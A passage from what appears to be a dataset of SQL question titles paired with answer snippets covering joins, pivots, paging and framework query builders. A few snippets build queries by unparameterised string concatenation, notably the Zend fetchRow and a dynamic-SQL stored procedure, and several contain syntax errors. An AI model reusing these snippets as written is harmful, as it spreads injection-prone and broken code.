        ORDER BY `user` , RAND()
        ) t
CROSS JOIN (SELECT @t:=0,@r:=0) t2
where rownum <= 100
"
9315,71473,Single SQL query on many to many relationship,"select p.*, group_concat(DISTINCT c.title ORDER BY c.title DESC SEPARATOR ', ')
from Posts p
inner join PostCategories pc on p.ID = pc.ID_Post
inner join Categories c on pc.ID_Category = c.ID
group by p.id, p.title, p.content
"
15782,22378,How to determine which rows in table are not properly sorted by parent table,"select distinct ParentId
from 
(
select *, rn=ROW_NUMBER() over (partition by parentid order by sortorder) -1
from Child
) X
where rn <> Sortorder
"
33737,4438,How to create a query and get the result from the query in Zend 1?,"$db = Zend_Db_Table::getDefaultAdapter();
$row = $db->fetchRow(""SELECT * FROM order_products_names where order_id = '"". $last_id . ""'"");
echo $row['names'];
"
2845,57857,Oracle SQL: invalid identifier,"CREATE OR REPLACE VIEW DoctorsLoad AS
    SELECT dID, gender, specialty, 'Overloaded' AS dLoad
    FROM Doctor D, Examine E
    WHERE D.dID = E.doctor_id
    GROUP BY dID, gender, specialty
    HAVING COUNT(*) > 10
    UNION ALL
    SELECT dID, gender, specialty, 'Underloaded' AS dLoad
    FROM Doctor D, Examine E
    WHERE D.dID = E.doctor_id
    GROUP BY dID, gender, specialty
    HAVING COUNT(*) <= 10;
"
39504,53485,Populate the maximum value without a join oracle," first_value(step) over (partition by value1 order by date_ desc)
"
3119,64984,Count items and create an array,"SELECT a, array_agg(bs) AS b_list
FROM  (
    SELECT a, b || ':' || count(*) AS bs  -- coerced to text automatically
    FROM   tbl
    GROUP  BY a, b
    ORDER  BY a, b   -- to sort b_list in the result
    ) x
GROUP  BY a;
"
5322,12781,mysql select query issue,"SELECT j.id job_id ,sum(case when amount is null then 0 else amount end)
FROM jobs j LEFT JOIN payments p ON j.id=p.job_id
GROUP BY j.id
HAVING sum(case when amount is null then 0 else amount end) < 1000;
"
29644,9466,How to distinct on a single column in a query in SQL?,"SELECT users.userid, buildings.building 
FROM (
  SELECT userid, bldgcode FROM facstaff 
  UNION 
  SELECT userid, dorm AS bldgcode FROM students
  LEFT JOIN facstaff ON facstaff.userid = students.userid
  WHERE facstaff.userid IS NULL
) AS users
  INNER JOIN buildings ON users.bldgcode=buildings.bldgcode 
WHERE userid in (<list of users>);
"
30253,41305,mysql custom auto increment field with pre/suffix text,"CREATE TABLE my_table (
  prefix CHAR(2),
  number INT(5) ZEROFILL AUTO_INCREMENT,
  PRIMARY KEY (number)
);

INSERT INTO my_table (prefix) VALUES ('XX'), ('XX'), ('XX');

SELECT CONCAT(prefix, number) FROM my_table;
"
12077,34033,Create a temporary table in SQL on the fly,"select * into #TempTable
from MyTable
where 1=0
"
28729,8812,SQL Query - return row values as columns,"SElECT part,
    MAX(CASE WHEN X = 1 THEN Y END) Y1,
    MAX(CASE WHEN X = 2 THEN Y END) Y2,
    MAX(CASE WHEN X = 3 THEN Y END) Y3,
    MAX(CASE WHEN X = 4 THEN Y END) Y4
FROM YourTable
GROUP BY part
"
20836,40595,Database structure for packages library,"Table Car
---------
id INT PRIMARY KEY
package_id INT NOT NULL
FOREIGN KEY (package_id)
  REFERENCES Package (package_id)    

Table Package
-------------
package_id INT PRIMARY KEY
alloys BOOLEAN
aircon BOLLEAN
airbags TINYINT
transmission ENUM('auto','manual')
"
29356,16287,Yii query builder,"$user = Yii::app()->db->createCommand()
    ->select('First_Name, User_ID')
    ->from('Users')
    ->where('First_name like :name', array(':name'=>$_GET['name']))
    ->queryRow();
"
9090,31620,Alternative to GROUP CONCAT,"SELECT  msg_v3_thread.thread_id, user_id, NULL as partner_id
FROM msg_v3_thread
LEFT JOIN msg_v3_thread_users ON msg_v3_thread_users.thread_id = msg_v3_thread.thread_id 
WHERE msg_v3_thread.thread_id = 3
UNION
SELECT  msg_v3_thread.thread_id, NULL as user_id, partner_id -- Here!
FROM msg_v3_thread
LEFT JOIN msg_v3_thread_partners ON msg_v3_thread_partners.thread_id = msg_v3_thread.thread_id 
WHERE msg_v3_thread.thread_id = 3
"
8567,65456,PostgreSQL performing an OR merge of two similar tables,"select year, 
       coalesce(a.r001, b.r001) as r001,
       coalesce(a.r002, b.r002) as r002
from table_a a
  full outer join table_b b using (year)
order by year;
"
26114,27068,join tables and SUM columns for each distinct row with some rows are considered as column,"WITH table1(id1, total_amount, final_amount, p_id)
     AS (SELECT 1,500,505,10 UNION ALL
         SELECT 2,700,710,20 UNION ALL
         SELECT 3,400,400,10 UNION ALL
         SELECT 4,450,460,20 UNION ALL
         SELECT 5,300,300,10),
     table2(id2, month, amount, id1)
     AS (SELECT 1,'jan',300,1 UNION ALL
         SELECT 2,'feb',200,1 UNION ALL
         SELECT 3,'jan',200,2 UNION ALL
         SELECT 4,'feb',500,2 UNION ALL
         SELECT 5,'feb',400,3 UNION ALL
         SELECT 6,'jan',150,4 UNION ALL
         SELECT 7,'feb',300,4 UNION ALL
         SELECT 8,'jan',300,5),
     t1
     AS (SELECT p_id,SUM(final_amount) AS total_amount
         FROM   table1
         GROUP  BY p_id),
     t2
     AS (SELECT p_id,
                SUM(CASE WHEN month = 'jan' THEN amount END) AS jan,
                SUM(CASE WHEN month = 'feb' THEN amount END) AS feb
         FROM   table2
                JOIN table1
                  ON table1.id1 = table2.id1
         GROUP  BY p_id)
SELECT Row_number() OVER (ORDER BY (SELECT 0)) AS id3,t1.p_id,jan,feb,
       total_amount
FROM   t1
       JOIN t2
         ON t1.p_id = t2.p_id 
"
13157,40019,MySql retrieve products and prices,"SElECT p.*, q2.*
  FROM 
(
  SElECT Product_id
    FROM Price
   WHERE `start` >= '2013-05-01' AND `end` <= '2013-05-15'
   GROUP BY Product_id
  LIMIT 0,10
) q1 JOIN 
(
    SELECT *
      FROM Price
     WHERE `start` >= '2013-05-01' AND `end` <= '2013-05-15'
) q2 ON q1.Product_id = q2.Product_id JOIN product p
     ON q1.Product_id = p.Id
"
1541,59939,sql query to groupby with a deduplicated column,"select date_trunc('week', datetime) wdt, event_name, count(distinct email) 
from events
group by wdt, event_name;
"
8056,10721,Sql instead of insert trigger - insert data if does not exist,"Insert into bbownermap (deviceid, devicenumber)
Select i.ndl_DeviceID, <deviceNum>
From inserted i
  Left join bbownermap b on i.deviceid=b.deviceid
Where b.ownerid is Null
"
22264,47857,SQL - average distance per day,"SELECT id_car, date, AVG(table_distances.distance) 
FROM table_distances
INNER JOIN table_cars 
ON table_distances.id_car = table_cars.id
WHERE table_cars.license = 'Paris'
GROUP BY id_car, date
ORDER BY id_car, date
"
24956,63795,MVC model and SQL table name are the same,"class Application_Model_DbTable_Poll extends Zend_Db_Table_Abstract
{
    protected $_name = 'Poll';
}
"
20590,9039,How to use sql server like query?," DECLARE @search VARCHAR(20)

 SET @search = 'sh'    

 SELECT * FROM tbl_master WHERE Name LIKE @search+'%'    
"
26737,3407,how to reference a control in a subform in tab control,"WHERE F.Project = Forms![Panel]![subFormFind]![cboProject] 
                       ^^FORM     ^^Subform    ^^Control
"
26793,22187,sql query for all values in single row,"SELECT t.ID, t.Patient, t.Study,
       SUM(t.AVA) as AVA, SUM(t.LVOT) as LVOT, SUM(t.LV) as LV, SUM(t.AVPG) as AVPG
FROM table t
GROUP BY t.ID, t.Patient, t.Study;
"
9154,34869,SQL VB.net insert using select AND values,"Insert into [MyTable] (Max,Value1,Value2,Value3) values((select Max(Number) from Table1),@p1,@p2,@p3)
"
39989,10367,SQL Query multiple table with same column,"select count(*)
from (
    select CreationDate, LastModifiedDate from Table1
    union all
    select CreationDate, LastModifiedDate from Table2
    union all
    select CreationDate, LastModifiedDate from Table3
) a 
where CreationDate is null or LastModifiedDate is null
"
30295,4425,ORDER BY condition,"SELECT * FROM foo ORDER BY id IN (1,2,3) DESC, created_date ASC
"
13479,64685,MAX on two columns in mysql,"SELECT Max(t2.c1) as C1, 
       Max(t1.c2) as C2 
FROM   t t1 
       INNER JOIN (SELECT Max(c1) AS C1 
                   FROM   t) t2 
               ON t1.c1 = t2.c1 
"
26057,13597,Avoiding nullable foreign keys in many-to-many table,"@DatabaseField(foreign = true,
               columnDefinition = ""integer references foreignOne(id)"" )
private ForeignOne foreignOne;
"
7522,69574,"SQL Rounding Percentages to make the sum 100% - 1/3 as 0.34, 0.33, 0.33","P    S    PCT           Total  
--   --   ------------  ------  
P1   S1   .33333333333  10.00   
P2   S2   .33333333333  10.00   
P3   S3   .33333333333  10.00   


SELECT 
   BaseTable.P, BaseTable.S, 
   CASE WHEN BaseTable.S = TotalTable.MinS 
      THEN BaseTable.BaseAllocatedValue + TotalTable.Remainder
      ELSE BaseTable.BaseAllocatedValue
   END As AllocatedValue
FROM
(SELECT
   P, S, FLOOR((PCT * Total * 100)) / 100 as BaseAllocatedValue,
   FROM dataTable) BaseTable
INNER JOIN
(SELECT
   P, MIN(S) AS MinS,
   SUM((PCT * Total) - FLOOR((PCT * Total * 100)) / 100) as Remainder,
FROM dataTable
GROUP BY P) as TotalTable
ON (BaseTable.P = TotalTable.P)
"
15543,71378,SQL Joins and Renaming columns,"SELECT Animal.Name AS Name
FROM (SELECT AnimalID FROM Cat
      UNION
      SELECT AnimalID FROM Dog) AS AnimalsUnion
LEFT JOIN Animal
       ON Animal.AnimalID = AnimalsUnion.AnimalID
"
4699,9730,Select rows as column,"SELECT product_id FROM tbl WHERE ""name""='color' AND ""value""='red'
INTERSECT
SELECT product_id FROM tbl WHERE ""name""='brand' AND ""value""='xxx';
"
1286,53598,How to use table as variable in stored procedure,"CREATE PROCEDURE countcv @table_name VARCHAR(50),@column_name VARCHAR(50)
AS
BEGIN
declare @SQL nvarchar(max)  
set @SQL  = 'SELECT '+@column_name+',COUNT('+@column_name+') 
             FROM '+@table_name+'  
             GROUP BY '+@column_name+' 
             ORDER BY COUNT('+@column_name+')'

EXEC sp_executesql @SQL
END
"
18231,23222,double sort -- sort of -- in sql,"order by Country, City
"
21289,61579,SQL SELECT with m:n relationship,"select *
from user u
where 3 = (
    select count(distinct t.id)
    from user_has_tag uht
    inner join tag t on t.id = uht.tag_id
    where t.name in ('apple', 'orange', 'banana') 
    and uht.user_id = u.userid
)
"
5125,70165,SQLite equivalent query of the given MSSQL query.,"select *
from yourtable
where
    id in (
        select min(y.id)
        from yourtable as y
            inner join (
            select [TKG], max([CAP]) as [CAP]
            from yourtable
            group by [TKG]
        ) as y2 on y2.[TKG] = y.[TKG] and y2.[CAP] = y.[CAP]
        group by y.[TKG]
    )
"
28352,11570,"how to rebuild / reinstall ssrs (reportserver, reportservertempdb) databases?","USE ReportServer
go


WITH
[Sub_Parameters] AS
(
SELECT 
[SubscriptionID],
[Parameters] = CONVERT(XML,a.[Parameters])
FROM [Subscriptions] a
),
[MySubscriptions] AS
(
SELECT DISTINCT
[SubscriptionID],
[ParameterName] = QUOTENAME(p.value('(Name)[1]', 'nvarchar(max)')),
[ParameterValue] = p.value('(Value)[1]', 'nvarchar(max)')
FROM 
[Sub_Parameters] a
CROSS APPLY [Parameters].nodes('/ParameterValues/ParameterValue') t(p)
),
[SubscriptionsAnalysis] AS
(
SELECT
a.[SubscriptionID],
a.[ParameterName],
[ParameterValue] = 
(SELECT
STUFF(( 
SELECT [ParameterValue] + ', ' as [text()]
FROM [MySubscriptions]
WHERE 
[SubscriptionID] = a.[SubscriptionID]
AND [ParameterName] = a.[ParameterName]
FOR XML PATH('')
),1, 0, '')
+'')
FROM [MySubscriptions] a
GROUP BY a.[SubscriptionID],a.[ParameterName]
)
SELECT
a.[SubscriptionID],
c.[UserName] AS Owner, 
b.Name,
b.Path,
a.[Locale], 
a.[InactiveFlags], 
d.[UserName] AS Modified_by, 
a.[ModifiedDate], 
a.[Description], 
a.[LastStatus], 
a.[EventType], 
a.[LastRunTime], 
a.[DeliveryExtension],
a.[Version],
e.[ParameterName],
LEFT(e.[ParameterValue],LEN(e.[ParameterValue])-1) as [ParameterValue],
SUBSTRING(b.PATH,2,LEN(b.PATH)-(CHARINDEX('/',REVERSE(b.PATH))+1)) AS ProjectName
FROM 
[Subscriptions] a 
INNER JOIN [Catalog] AS b
ON a.[Report_OID] = b.[ItemID]
LEFT OUTER JOIN [Users] AS c
ON a.[OwnerID] = c.[UserID]
LEFT OUTER JOIN [Users] AS d
ON a.MODIFIEDBYID = d.Userid
LEFT OUTER JOIN [SubscriptionsAnalysis] AS e 
ON a.SubscriptionID = e.SubscriptionID

ORDER BY projectname
"
21404,10077,how to create pivot query for this result?,"SELECT Tital, 
       [SEND],
       [BID],
       [FINAL]
FROM   (SELECT t.TITAL AS tt,
               c.TITAL,
               cdata
        FROM   Tablename t
               CROSS apply ( VALUES ('PCS',[PCS]),
                                    ('RGH_CTS',[RGH_CTS]),
                                    ('VALUE',VALUE) ) c (TITAL, cdata)) a
       PIVOT (Max(cdata)
             FOR tt IN([SEND],
                       [BID],
                       [FINAL])) piv 
"
7650,33391,Fast Relational method of storing tree data (for instance threaded comments on articles),"1
1.1
1.1.1
1.2
1.2.1
"
5974,12830,Joining tables on foreign key,"Select p.ProductName, pu.Pucrchased, s.Sold
From Products p 
INNER JOIN Pucrchase pu on p.ProductID = pu.ProductID
INNER JOIN Sale s on s.ProductID = p.ProductID
"
16685,25471,How to select two airport names based on two airport codes in one table?,"SELECT
  flightNumber, 
  timeOfDeparture, 
  DA.name AS 'Departure Airport',
  AA.name AS 'Arrival Airport'
FROM
  Flight As F
  INNER JOIN Airport As DA
  ON F.departureAirport_IATA = DA.airportIATA
  INNER JOIN Airport As AA
  ON F.arrivalAirport_IATA = AA.airportIATA
WHERE 
  F.stopOverAirport_IATA IS NULL
;
"
7712,64903,How to map two columns using another table in SQL?,"SELECT ut.user1, uz1.zipcode AS zip1, ut.user2, uz2.zipcode AS zip2
FROM user_table AS ut
JOIN user_zip AS uz1 ON ut.user1 = uz1.user
JOIN user_zip AS uz2 ON ut.user2 = uz2.user
"
25496,55488,SQL Server performance: full index on a table worth it?,"create table PointSearchHelper . . .
    points_id int not null primary key
"
31248,6002,Compare only DATE from 2 datetime columns - sql,"Select * from Admissions
Where DATEDIFF(dd,AdmitDateTime,DepartDateTime)=0
"
32422,12181,How can I sum a result in sql when the other results of other column are the same?,"SELECT
    t4.tar_nombre as nombre_tarea,
    t2.rdi_fechacti as fecha_actividad,
    t3.rea_hrstarea as horas_trabajadas,
    SUM(t3.rea_hrstarea)
FROM
    act_usuario t1
INNER JOIN
    act_regisdiario t2
ON
    (t2.usu_id = t1.usu_id)
INNER JOIN
    act_registtarea t3
ON
(t3.rdi_id = t2.rdi_id)
INNER JOIN
    act_tarea t4
ON
    (t4.tar_id = t3.tar_id)
WHERE
    t4.usu_id = 4 
GROUP BY
    t4.tar_nombre
ORDER BY
    t2.rdi_fechacti
"
1366,72970,Find Last Updated By and Last Update Date,"select employee_id,
       last_updated_dt,
       last_updated_by
  from (select x.*,
               max(last_updated_dt) over(partition by employee_id) as max_last_updated_dt
          from (select employee_id,
                       last_updated_dt,
                       last_updated_by
                  from employee
                union all
                select employee_id,
                       last_updated_dt,
                       last_updated_by
                  from employee_award
                union all
                select employee_id,
                       last_updated_dt,
                       last_updated_by
                  from employee_address) x) x
 where last_updated_dt = max_last_updated_dt
"
23508,38183,Determining an Oracle SQL MERGE statement result,"when matched update set .... merge_status = 'U'
when not matched insert ( ...., merge_status, ... ) values ( ...., 'I', .... )
"
30812,14569,"Crystal Reports: data in records is stored in columns in a row, how can I transpose those columns or choose maximum from them?","SELECT ID, 1 as idx, a1 as A, b1 as B, c1 as C

UNION 

SELECT ID, 2 as idx, a2 as A, b2 as B, c2 as C

...

UNION

SELECT ID, 20 as idx, a20 as A, b20 as B, c20 as C
"
2905,16610,ROW_NUMBER() Query Plan SORT Optimization,"SELECT
    V.vid,
    V.nid,
    V.sid,
    V.vote,
    V.time_stamp,
    V.new,
    V.eid
FROM
    dbo.Votes V
LEFT OUTER JOIN dbo.Votes V2 ON
    V2.vid = V.vid AND
    V2.nid = V.nid AND
    V2.sid = V.sid AND
    V2.same_voter <> 1 AND
    V2.eid <= @EId AND
    V2.eid > (@EId - 5) AND
    V2.country = @Country AND
    (V2.new > V.new OR (V2.new = V.new AND V2.time_stamp > V.time_stamp))
WHERE
    V.same_voter <> 1 AND
    V.eid <= @EId AND
    V.eid > (@EId - 5) AND
    V.country = @Country AND
    V2.vid IS NULL
"
38238,4226,the last result of the rules,"SELECT ru.id, ru.description, re.result_of_the_rule, re.date
    FROM (SELECT rule_id, MAX(date) AS MaxDate
              FROM result
              GROUP BY rule_id) q
        INNER JOIN rules ru
            ON q.rule_id = ru.id
        INNER JOIN result re
            ON q.rule_id = re.rule_id
                AND q.MaxDate = re.date
"
29006,31967,SQL Syntax on Using Row_Number for price sorting,"WITH cte AS
(
SELECT left(modelnumber,4) as ModelNumber,
  packetsize,
  price,
  row_number() over ( partition BY left(modelnumber,4),packetsize ORDER BY price ASC ) AS rownumber
  FROM test
)

SELECT * FROM cte
"
8714,73368,Group consecutive rows of same value using time spans,"SELECT    
    t0.ClassRoom,
    t0.CourseName,
    MIN(t0.StartTime),
    t0.EndTime
FROM (
    SELECT 
    t1.ClassRoom,
    t1.CourseName,
    t1.StartTime,
    (
        SELECT MAX(t2.EndTime)
        FROM tableA t2
        WHERE t2.CourseName = t1.CourseName
        AND t2.ClassRoom = t1.ClassRoom
        AND NOT EXISTS (SELECT 1 FROM tableA t3
            WHERE t3.EndTime < t2.EndTime 
            AND t3.EndTime > t1.EndTime
            AND (t3.CourseName <> t2.CourseName 
            OR t3.ClassRoom <> t2.ClassRoom)
        )
    ) EndTime
    FROM tableA t1
) t0 GROUP BY t0.ClassRoom, t0.CourseName, t0.EndTime
"
23512,62890,Need (Teradata) SQL Help On Selecting Specific Rows,"with t as (
      select t.*,
             row_number() over (partition by segment order by (case when market = grp_mkt then 1 else 2 end) desc) as seqnum
      from <your query/table here>  t
     )
select t.*
from t
where seqnum = 1;
"
23999,47479,How to select only groups of records based on value?,"select score, mdm
from yourtable t
where exists (
    select 1
    from yourtable t2
    where t.mdm = t2.mdm and t2.score = 1
)
"
38165,72749,SQL aggregate functions value multiplication,"SELECT e.id, ec.category_ids, a.NumAttendees, e.event_capacity
FROM events e LEFT JOIN
     (SELECT a.event_id, COUNT(*) as NumAttendees
      FROM attendees a
      GROUP BY a.event_id
     ) a
     ON a.event_id = e.id LEFT JOIN
     (SELECT ec.event_id, GROUP_CONCAT(c.id SEPARATOR ',') as category_ids
      FROM event_categories ec JOIN
           categories c
           ON ec.category_id = c.id 
      GROUP BY ec.event_id
     ) ec
     ON  e.id=ec.event_id 
HAVING NumAttendees < e.event_capacity OR e.event_capacity = 0;
"
5400,27508,Unable to read data into SQL Server 2005 from an XML file,"declare @xml xml 
select @xml='<?xml version=""1.0"" encoding=""utf-8""?>
 <ArrayOfTerm_Child xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""  xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://tempuri.org/"">
   <Term_Child>
<TermID>2021</TermID>
<Name>A. Geographic locations</Name>
<ParentID>0</ParentID>
 </Term_Child>
<Term_Child>
<TermID>3602</TermID>
<Name>Oceania</Name>
<ParentID>2021</ParentID>
 </Term_Child>
 <Term_Child>
<TermID>3604</TermID>
<Name>Australasia</Name>
<ParentID>3602</ParentID>
 </Term_Child>
 </ArrayOfTerm_Child>'

;WITH XMLNAMESPACES(DEFAULT 'http://tempuri.org/')
SELECT X.TermsTree.query('TermID').value('.', 'INT'),
       X.TermsTree.query('ParentID').value('.', 'INT'),
       X.TermsTree.query('Name').value('.', 'VARCHAR(2000)')
FROM @xml.nodes('/ArrayOfTerm_Child/Term_Child') X(TermsTree)
"
39055,75606,Oracle cilent and Perl installation on Centos,"# These are usually pre-set in my environment:
export ORACLE_PATH=/usr/lib/oracle/11.2/client64/bin
export ORACLE_BASE=/usr/lib/oracle
export ORACLE_HOME=/usr/lib/oracle/11.2/client64
export ORACLE_DOC=/usr/lib/oracle/11.2/client64/doc
export ORACLE_SID=Mydbsid
# My PATH include my /perl/bin directory

# My script starts here:
ulimit

/perl/bin/perl -MCPAN -e 'install(qw(LWP HTTP::Date))'
/perl/bin/perl -MCPAN -e 'install(qw(Bundle::CPAN))'
/perl/bin/perl -MCPAN -e 'install(qw(Bundle::libnet Bundle::LWP Bundle::DBD::CSV Bundle::Net::LDAP))'

export LD_LIBRARY_PATH=/usr/lib/oracle/11.2/client64/lib
export TNS_ADMIN=my_tnsnames.ora_directory
export ORACLE_USERID=Username/Password@Mydbsid

/perl/bin/perl -MCPAN -e 'install(qw(DBD::Oracle))'

export DBICTEST_ORA_DSN mydbsid
export DBICTEST_ORA_USER Username
export DBICTEST_ORA_PASS Password
export DBI_DRIVER Oracle
export DBI_DATABASE Mydbsid
export DBI_USERNAME Username
export DBI_PASSWORD Password

/perl/bin/perl -MCPAN -e 'install(qw(Time::Piece Date::Simple DateTime::Format::Oracle Math::Base36 Class::DBI::Plugin::DeepAbstractSearch Class::Trigger DBIx::ContextualFetch DBIx::Class))'
/perl/bin/perl -MCPAN -e 'install(qw(Task::Kensho))'
# It continues, but nothing more database-orientated appears later.
"
34981,1242,Finding specific duplicates when one field is different,"SELECT Name
FROM myTable
GROUP BY Name
HAVING COUNT(*) > 1
WHERE Name NOT IN (SELECT Name FROM myTable WHERE StartDate IS NULL)
"
20927,3514,Returning relevant records which are listed in selected column,"SELECT *
FROM table t
WHERE EXISTS (SELECT 1 FROM table t2 WHERE t2.id = 5 and find_in_set(t.id, t2.posts) > 0);
"
26302,1593,Paging with Oracle,"SELECT * FROM
(
    SELECT a.*, rownum r__
    FROM
    (
    	SELECT * FROM ORDERS WHERE CustomerID LIKE 'A%'
    	ORDER BY OrderDate DESC, ShippingDate DESC
    ) a
    WHERE rownum < ((pageNumber * pageSize) + 1 )
)
WHERE r__ >= (((pageNumber-1) * pageSize) + 1)
"
25517,30186,SQL Server XML queries against text data type,"SELECT
    CAST(XMLContent AS XML).value('.....', '..') 
"
22605,70666,Oracle SQL update swap numbers,"update table set Type = 11 - Type
where Type in (5,6)
"
6257,64422,Oracle query for displaying View meta data," SELECT O.Owner, O.object_name, C.ColumN_Name, C.Data_Type, O.Object_type, O.Object_Type, 
    AD.Referenced_name, AD.Referenced_Type
  FROM ALL_TAB_COLS c
  INNER JOIN ALL_OBJECTS O
    ON c.TABLE_NAME = o.object_name
    and C.Owner = O.Owner
  INNER JOIN ALL_DEPENDENCIES AD
    on AD.Name = O.Object_Name
    and AD.Owner = O.Owner
  WHERE  o.object_type = 'VIEW' 
  and O.owner = user
  ORDER BY c.table_name, c.column_id;
"
13053,17444,Optional parameters in SSRS 2008,"SELECT SH.[CompanyKey]
  ,[DeliveryDate]
  ,[CustomerKey]
  ,AcAccounts.ShortDesc
  ,SH.[ItemKey]
  ,ITEM.ItemDesc
  ,[InvoiceDate]
  ,[SalesRep1Key]
  ,[SalesRep2Key]
  ,[ReturnCancelCode]
  ,[ShipToKey]
  ,[BillToKey]
  ,[RouteNo]
  ,[PaymentTypeKey]
  ,[DeliveryTypeKey]
  ,[OrderNo]
  ,[OrderDate]
  ,[OrderStatus]
  ,[PostingPeriod]
  ,[Quantity]
  ,[QuantityUnit]
  ,[QuantityConvFactor]
  ,[OldOrderNo]
  ,[OrderVersionNo]
  ,[PONumber]
FROM 
[Company].[dbo].[FactSalesHistoryDS] SH
INNER JOIN [FRESHWAY].[dbo].[DimFiAcAccounts] AcAccounts ON
AcAccounts.AccountKey = SH.CustomerKey 
INNER JOIN [freshway].[dbo].[dimitem] ITEM ON
SH.ItemKey = ITEM.ItemKey
WHERE INVOICEDATE BETWEEN @StartDate AND @EndDate
AND SH.ItemKey = CASE WHEN @ItemKey IS NOT NULL THEN @ItemKey ELSE SH.ItemKey END
AND SH.CustomerKey = CASE WHEN @CustomerKey IS NOT NULL THEN @CustomerKey  ELSE SH.CustomerKey END
"
10424,18870,Unpivot table in SQL Server,"with nums as (
      select 1 as n union all
      select n + 1
      from nums
      where n < 20
    )
select t.seqno, dateadd(day, 1 - nums.n, t.date), t.code,
       (case when nums.n = 1 then val1
             when nums.n = 2 then val2
             . . .
             when nums.n = 20 then val20
        end) as val
from table t cross join
     nums;
"
17083,66905,How to get all parent and child categories that each product belongs to?,"WITH
  hierarchy AS (
    SELECT
      prod.productId
    , prod.productName
    , cat.categoryId
    , cat.categoryParentId
    , cat.categoryName
    FROM dbo.ProductToCategoryLink AS link
    INNER JOIN dbo.Product AS prod
      ON prod.productId = link.productId
    INNER JOIN dbo.ProductCategory AS cat
      ON cat.categoryId = link.categoryId
    UNION ALL
    SELECT
      child.productId
    , child.productName
    , parent.categoryId
    , parent.categoryParentId
    , parent.categoryName
    FROM hierarchy AS child
    INNER JOIN dbo.ProductCategory AS parent
      ON parent.categoryId = child.categoryParentId
  )
SELECT
  productId
, productName
, categoryId
, categoryName
FROM hierarchy
ORDER BY
  productId
, categoryId
"
32632,57059,MySQL get minimum from function,"SELECT D.id 
FROM (SELECT id , DISTANCE_BETWEEN (Latitude,Longitude,43.2560997009,-2.9078400135) AS distance FROM Locations) AS D
ORDER BY distance
LIMIT 1
"
14011,3187,Joining the same table multiple times to get a view of all statuses of an order,"SELECT o.orderNo,
       c.name as customerName,
       u.name as salesmanName,
       o.orderdate,
       MAX(CASE WHEN s.type = 1 THEN plannedDate END) Planned1,
       MAX(CASE WHEN s.type = 2 THEN plannedDate END) Planned2,
       MAX(CASE WHEN s.type = 3 THEN plannedDate END) Planned3,
       MAX(CASE WHEN s.type = 4 THEN plannedDate END) Planned4,
       MAX(CASE WHEN s.type = 1 THEN finalDate   END) Final1,
       MAX(CASE WHEN s.type = 2 THEN finalDate   END) Final2,
       MAX(CASE WHEN s.type = 3 THEN finalDate   END) Final3,
       MAX(CASE WHEN s.type = 4 THEN finalDate   END) Final4,
       MAX(CASE WHEN s.type = 1 THEN isApproved  END) App1,
       MAX(CASE WHEN s.type = 2 THEN isApproved  END) App2,
       MAX(CASE WHEN s.type = 3 THEN isApproved  END) App3,
       MAX(CASE WHEN s.type = 4 THEN isApproved  END) App4
  FROM salesorderStatus s JOIN salesorders o
    ON s.orderId = o.id JOIN customers c
    ON o.customerId = c.id JOIN users u 
    ON o.salesmanId = u.id
 GROUP BY o.orderNo, c.name, u.name, o.orderdate
 ORDER BY o.orderNo DESC
"
6297,60070,SQL command to find when a document was last printed?,"SELECT doc_name, max(date_printed) FROM your_table GROUP BY doc_name;
"
3076,27033,How do I add a conditional column to a union query in MS SQL?,"--4th Column for both queries, if bin_value is a numeric type
case when part_value like '%XX' then bin_value 
       else 0 end as fourth_column

--4th Column for both queries, if bin_value is a string type
case when part_value like '%XX' then bin_value 
       else '0' end as fourth_column
"
5504,5853,Unused tables in FROM crashing query,"SELECT DISTINCT `R`.`id`,
                `R`.`label`
FROM `user` `U`
LEFT JOIN `user_right` `UR`
    ON `U`.`id` = `UR`.`userId`
LEFT JOIN `right` `R`
    ON `R`.`id` = `UR`.`rightId`
LEFT JOIN `user_group` `UG`
    ON `U`.`id` = `UG`.`userId`
LEFT JOIN `group_right` `GR`
    ON `UG`.`groupId` = `GR`.`groupId` AND `R`.`id` = `GR`.`rightId`
WHERE `U`.`login` = 'admin'
"
36504,70765,How can this SQL code to eliminate permutations be improved?,"insert into tab
select number1, number2, number3, number4, number5, number6, number7 from (
  select number1, number2, number3, number4, number5, number6, number7, 
    group_concat(number order by number) as sig from (
      select number1, number2, number3, number4, number5, number6, number7, number1 as number
      union all select number1, number2, number3, number4, number5, number6, number7, number2
      union all select number1, number2, number3, number4, number5, number6, number7, number3
      union all select number1, number2, number3, number4, number5, number6, number7, number4
      union all select number1, number2, number3, number4, number5, number6, number7, number5
      union all select number1, number2, number3, number4, number5, number6, number7, number6
      union all select number1, number2, number3, number4, number5, number6, number7, number7) a
) group by sig) b
"
14739,21032,Data synchronization between tables in mysql,"UPDATE table_b b, table_a a 
SET b.field1 = a.field1, b.field2 = a.field2  
WHERE b.primary_key = a.primary_key 
"
28082,62247,Which of these data models is the most correct?,"Joe Celko.     
Joe Celko's Trees and Hierarchies in SQL for Smarties, 
(The Morgan Kaufmann Series in Data Management Systems)
ISBN 1-55860-920-2
"
19944,11295,column split to another column,"select substring(fld_Detail, 1, charindex(':', fld_Detail)-1 )
where isnumeric(substring(fld_detail,1,1)) = 1
"
18782,58698,group date range with specific range,"CASE
  WHEN month([Date]) BETWEEN 2 AND 7 THEN 2
  ELSE 1
END
"
9471,36713,Create new rows using exist row in CTE,"WITH CTE_SalesSeparated AS (
      SELECT s.[Date], s.[Country], s.[Year],
             coalesce(ld.[Brand] + ' ' + which, s.Brand) as Brand,
             s.SalesCount * coalesce(ld.factor, 1) as SalesCOunt
      FROM CTE_Sales s LEFT JOIN
           (SELECT 'HP' as Brand, 'LapTop' as which, 0.8 as factor UNION ALL
            SELECT 'HP' as Brand, 'DeskTop' as which, 0.2 as factor
           ) ld
           ON s.Brand = ld.Brand
     )
"
2511,72327,SQL Dynamic Query String Breaks When Variable Contains Single Quote," DECLARE @sql varchar(max)
SET @sql = ' INSERT INTO ' + @tempTable1 + 
       ' SELECT 0 as Type1, 0 as Type2, ' + ''''+
         replace( @name ,'''','''''')+''''+' as CompanyName  
       FROM #tempTable2 tt2'
"
28961,40133,mysql multiple update,"REPLACE INTO `rank` (`user_id`,`week`,`change`) VALUES (364709193,'201042','new),(291179703,'201042','new'), ... etc.
"
1902,53211,Rolling up line items,"Select
PURCHLINE.PURCHID, 
SUM(Purchline.PurchPrice)
FROM PURCHLINE
INNER JOIN PURCHTABLE ON PURCHTABLE.PURCHID= PURCHLINE.PURCHID 
where PURCHLINE.PURCHID ='192325'
group by PURCHLINE.PURCHID WITH ROLLUP
"
